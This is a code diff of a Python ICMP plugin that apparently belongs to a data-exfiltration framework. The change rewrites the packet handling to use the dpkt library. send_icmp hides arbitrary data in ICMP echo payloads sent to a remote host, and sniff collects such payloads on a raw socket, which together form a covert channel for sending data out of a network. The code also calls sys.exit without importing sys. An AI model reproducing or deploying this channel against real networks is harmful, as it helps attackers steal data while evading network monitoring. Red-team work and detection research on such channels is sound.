@@ -1,53 +1,29 @@
-import logging
 import base64
 import socket
-from struct import pack
-from random import choice
+from random import choice, randint
+from dpkt import ip, icmp
 
 config = None
 app_exfiltrate = None
-
-# http://wiki.dreamrunner.org/public_html/Python/Python-Things.html
-def checksum(source_string):
-    sum = 0
-    countTo = (len(source_string)/2)*2
-    count = 0
-    while count<countTo:
-        thisVal = ord(source_string[count + 1])*256 + \
-                ord(source_string[count])
-        sum = sum + thisVal
-        #sum = sum & 0xffffffff
-        count = count + 2
-    if countTo<len(source_string):
-        sum = sum + ord(source_string[len(source_string) - 1])
-        #sum = sum & 0xffffffff
-    sum = (sum >> 16)  +  (sum & 0xffff)
-    sum = sum + (sum >> 16)
-    answer = ~sum
-    answer = answer & 0xffff
-    answer = answer >> 8 | (answer << 8 & 0xff00)
-    return answer
-# end of copy-paste
 
 def send_icmp(dst, data):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     except:
-        print "root power you must have !"
+        app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
         sys.exit()
     ip_dst = socket.gethostbyname(dst)
-    icmp_type = 8
-    icmp_code = 0
-    icmp_sum  = 0
-    icmp_id   = 1
-    icmp_seq  = 1
-    icmp_hdr = pack('!BBHHH', icmp_type, icmp_code, icmp_sum, icmp_id, icmp_seq)
-    icmp_sum = checksum(icmp_hdr + data)
-    icmp_hdr = pack('!BBHHH', icmp_type, icmp_code, icmp_sum, icmp_id, icmp_seq)
-    packet = icmp_hdr + data
+    echo = icmp.ICMP.Echo()
+    echo.id = randint(0, 0xffff)
+    echo.seq = 1
+    echo.data = data
+    icmp_pkt = icmp.ICMP()
+    icmp_pkt.type = icmp.ICMP_ECHO
+    icmp_pkt.data = echo
     try:
-        s.sendto(packet, (ip_dst, 0))
+        s.sendto(icmp_pkt.pack(), (ip_dst, 0))
     except:
+        app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
         pass
     s.close()
 
@@ -70,15 +46,14 @@ def sniff(handler):
     sock.bind(('', 1))
     while True :
         try:
-            data = sock.recv(65536)
-            ip_ihl = ord(data[:1]) & 0x0f
-            ip_hdr = data[:(ip_ihl)*4]
-            icmp_data = data[(ip_ihl)*4:]
-            icmp_type = icmp_data[:1]
-            if icmp_type == '\x08':
-                ip_src = socket.inet_ntoa(ip_hdr[-8:-4])
-                ip_dst = socket.inet_ntoa(ip_hdr[-4:])
-                payload = icmp_data[4:]
+            data = sock.recv(65535)
+            ip_pkt = ip.IP()
+            ip_pkt.unpack(data)
+            icmp_pkt = ip_pkt.data
+            if icmp_pkt.type == icmp.ICMP_ECHO:
+                ip_src = socket.inet_ntoa(ip_pkt.src)
+                ip_dst = socket.inet_ntoa(ip_pkt.dst)
+                payload = icmp_pkt.data.data
                 handler(payload, ip_src, ip_dst)
         except:
             sock.close()
